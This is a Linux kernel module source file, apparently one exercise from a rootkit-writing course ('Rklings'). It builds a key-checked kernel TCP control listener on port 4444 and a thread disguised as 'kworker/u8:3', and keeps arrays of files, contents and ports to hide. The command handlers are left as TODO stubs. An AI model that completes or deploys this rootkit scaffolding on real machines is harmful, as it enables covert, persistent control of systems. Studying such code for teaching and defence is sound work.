// SPDX-License-Identifier: GPL-2.0
#include <crypto/hash.h>
#include <linux/init.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/string.h>
#include <linux/utsname.h>
#include <net/net_namespace.h>

#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64
#define RK_FP_LEN	4
#define RK_PORT		4444
#define RK_BUF_MAX	512
#define RK_MAX_TARGETS	16
#define RK_TARGET_LEN	64

static char *control_key;
module_param(control_key, charp, 0);

static u8 rk_key[RK_KEY_LEN];
static u8 rk_fingerprint[RK_FP_LEN];

/* Hidden target arrays */
static char hidden_files[RK_MAX_TARGETS][RK_TARGET_LEN];
static int file_count;

static char hidden_contents[RK_MAX_TARGETS][RK_TARGET_LEN];
static int content_count;

static unsigned short hidden_ports[RK_MAX_TARGETS];
static int port_count;

static struct task_struct *rk_thread;
static struct socket *rk_listen_sock;

/* ---- crypto helpers (from L22) ---- */

static int rk_compute_fingerprint(const u8 *key, size_t key_len,
				  u8 *fp, size_t fp_len)
{
	struct crypto_shash *tfm;
	struct shash_desc *desc;
	u8 digest[32];
	int error;

	tfm = crypto_alloc_shash("sha256", 0, 0);
	if (IS_ERR(tfm))
		return PTR_ERR(tfm);

	desc = kzalloc(sizeof(*desc) + crypto_shash_descsize(tfm), GFP_KERNEL);
	if (!desc) {
		crypto_free_shash(tfm);
		return -ENOMEM;
	}

	desc->tfm = tfm;
	error = crypto_shash_digest(desc, key, key_len, digest);
	if (error)
		goto out;

	memcpy(fp, digest, fp_len);

out:
	memzero_explicit(digest, sizeof(digest));
	kfree(desc);
	crypto_free_shash(tfm);
	return error;
}

bool rk_key_verify(const u8 *incoming, size_t len)
{
	if (!incoming || len != RK_FP_LEN)
		return false;
	return memcmp(incoming, rk_fingerprint, RK_FP_LEN) == 0;
}

/* ---- socket helpers ---- */

static int rk_send(struct socket *sock, const void *buf, size_t len)
{
	struct msghdr msg = { 0 };
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };

	return kernel_sendmsg(sock, &msg, &vec, 1, len);
}

static int rk_recv(struct socket *sock, void *buf, size_t len)
{
	struct msghdr msg = { 0 };
	struct kvec vec = { .iov_base = buf, .iov_len = len };

	return kernel_recvmsg(sock, &msg, &vec, 1, len, 0);
}

/* ---- command handlers ---- */

/*
 * TODO: Implement rk_cmd_info.
 *
 * 1. Call utsname() to get the system identity.
 * 2. Format "nodename: %s\nrelease: %s\nmachine: %s\n" with snprintf.
 * 3. Send the formatted buffer to the client with rk_send.
 */

/*
 * TODO: Implement rk_cmd_list.
 *
 * Accept a category string: "FILE", "CONTENT", or "PORT".
 * For each category:
 *   - If the count is zero, send "empty\n".
 *   - Otherwise iterate the array, format "[index] value\n", and send each line.
 * If the category is unknown, send "unknown category\n".
 */

/*
 * TODO: Implement rk_cmd_unhide_all.
 *
 * Set file_count, content_count, and port_count to 0.
 * Send "cleared\n" to the client.
 */

/* ---- dispatcher ---- */

static int rk_dispatch(struct socket *client, char *cmd)
{
	size_t len = strlen(cmd);

	if (len > 0 && cmd[len - 1] == '\n')
		cmd[len - 1] = '\0';

	/*
	 * TODO: Match commands and call the appropriate handler.
	 *
	 * "INFO"          --> rk_cmd_info(client)
	 * "LIST <cat>"    --> rk_cmd_list(client, cmd + 5)
	 * "UNHIDE ALL"    --> rk_cmd_unhide_all(client)
	 * otherwise       --> send "unknown command\n"
	 */

	return rk_send(client, "unknown command\n", 16);
}

/* ---- agent thread ---- */

static void rk_handle_client(struct socket *client)
{
	char buf[RK_BUF_MAX];
	int n;

	while (!kthread_should_stop()) {
		memset(buf, 0, sizeof(buf));
		n = rk_recv(client, buf, sizeof(buf) - 1);
		if (n <= 0)
			break;
		buf[n] = '\0';
		rk_dispatch(client, buf);
	}
}

static int rk_agent_thread(void *data)
{
	struct socket *client = NULL;
	int error;

	while (!kthread_should_stop()) {
		error = kernel_accept(rk_listen_sock, &client, 0);
		if (error < 0)
			break;
		rk_handle_client(client);
		sock_release(client);
		client = NULL;
	}
	return 0;
}

/* ---- module lifecycle ---- */

static int __init rk_init(void)
{
	struct sockaddr_in addr;
	u32 fp_val;
	int error;

	if (!control_key)
		return -EINVAL;
	if (strlen(control_key) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (hex2bin(rk_key, control_key, RK_KEY_LEN) < 0)
		return -EINVAL;

	memzero_explicit(control_key, RK_KEY_HEX_LEN);

	error = rk_compute_fingerprint(rk_key, RK_KEY_LEN,
				       rk_fingerprint, RK_FP_LEN);
	if (error)
		goto fail_key;

	fp_val = (rk_fingerprint[0] << 24) | (rk_fingerprint[1] << 16) |
		 (rk_fingerprint[2] << 8)  |  rk_fingerprint[3];
	pr_info("rklings: key loaded, fingerprint %08x\n", fp_val);

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &rk_listen_sock);
	if (error)
		goto fail_key;

	sock_set_reuseaddr(rk_listen_sock->sk);

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_port = htons(RK_PORT);

	error = kernel_bind(rk_listen_sock, (struct sockaddr *)&addr,
			    sizeof(addr));
	if (error)
		goto fail_sock;

	error = kernel_listen(rk_listen_sock, 1);
	if (error)
		goto fail_sock;

	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
	if (IS_ERR(rk_thread)) {
		error = PTR_ERR(rk_thread);
		rk_thread = NULL;
		goto fail_sock;
	}

	return 0;

fail_sock:
	sock_release(rk_listen_sock);
	rk_listen_sock = NULL;
fail_key:
	memzero_explicit(rk_key, sizeof(rk_key));
	return error;
}

static void __exit rk_exit(void)
{
	if (rk_thread)
		kthread_stop(rk_thread);
	if (rk_listen_sock) {
		kernel_sock_shutdown(rk_listen_sock, SHUT_RDWR);
		sock_release(rk_listen_sock);
	}
	memzero_explicit(rk_key, sizeof(rk_key));
	memzero_explicit(rk_fingerprint, sizeof(rk_fingerprint));
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
